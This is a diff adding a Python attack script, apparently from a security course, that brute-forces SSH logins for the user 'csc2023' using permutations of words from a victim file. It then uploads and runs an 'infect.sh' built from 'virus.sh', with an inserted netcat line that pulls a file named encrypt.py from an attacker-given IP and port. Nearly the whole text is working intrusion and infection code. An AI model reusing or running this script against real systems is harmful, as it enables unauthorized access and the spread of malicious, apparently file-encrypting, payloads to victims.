@@ -1,0 +1,83 @@
+#!/usr/bin/env python3
+import itertools, paramiko, sys, socket, time
+
+def dictionary_attack(hostname):
+    # initialize SSH client
+    client = paramiko.SSHClient()
+    # add to know hosts
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    f = open('/home/csc2023/materials/victim.dat')
+    lines = f.read().splitlines()
+
+    for i in range(1, len(lines)+1):
+        print(i)
+        for test in list(itertools.permutations(lines, i)):
+            password = ''
+            for t in test:
+                password += t
+            client = try_ssh_crack(hostname, 'csc2023', password)
+            if client:
+                return client
+            
+def try_ssh_crack(hostname, username, password):
+    # initialize SSH client
+    client = paramiko.SSHClient()
+    # add to know hosts
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        client.connect(hostname=hostname, username=username, password=password, auth_timeout=0.5)
+    except socket.timeout:
+        # this is when host is unreachable
+        print(f"[!] Host: {hostname} is unreachable, timed out.")
+        client.close()
+        return False
+    except paramiko.AuthenticationException:
+        print(f"[!] Invalid credentials for {username}: {password}")
+        client.close()
+        return False
+    except paramiko.SSHException:
+        print(f"[*] Quota exceeded, retrying with delay...")
+        # sleep for a minute
+        time.sleep(1)
+        client.close()
+        return try_ssh_crack(hostname, username, password)
+    else:
+        # connection was established successfully
+        print(f"[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
+        return client
+
+def infect(client, ip, port):
+    f = open("virus.sh", "r")
+    data = f.readlines()
+    f.close()
+    # > encrypt.py is to send the output to encrypt.py
+    # < /dev/null is to send EOF to a program immediately when tries to read from its standard input.
+    data[25:25] = ["netcat " + ip + " " + port + " > encrypt.py < /dev/null\n"]
+    data = "".join(data)
+    f = open("infect.sh", "w")
+    f.write(data)
+    f.close()
+
+    trans = client.get_transport()
+    sftp = paramiko.SFTPClient.from_transport(trans)
+    sftp.put(localpath='./infect.sh', remotepath='/home/csc2023/infect.sh')
+    stdin, stdout, stderr = client.exec_command("chmod +x infect.sh")
+    msg, err = stdout.read(), stderr.read()
+    stdin, stdout, stderr = client.exec_command("bash infect.sh")
+    msg, err = stdout.read(), stderr.read()
+    trans.close()
+
+def main():
+    try:
+        hostname = sys.argv[1]
+        ip = sys.argv[2]
+        port = sys.argv[3]
+    except Exception as e:
+        print(e)
+        exit(0)
+    client = dictionary_attack(hostname)
+    infect(client, ip, port)
+
+if __name__ == '__main__':
+    main()
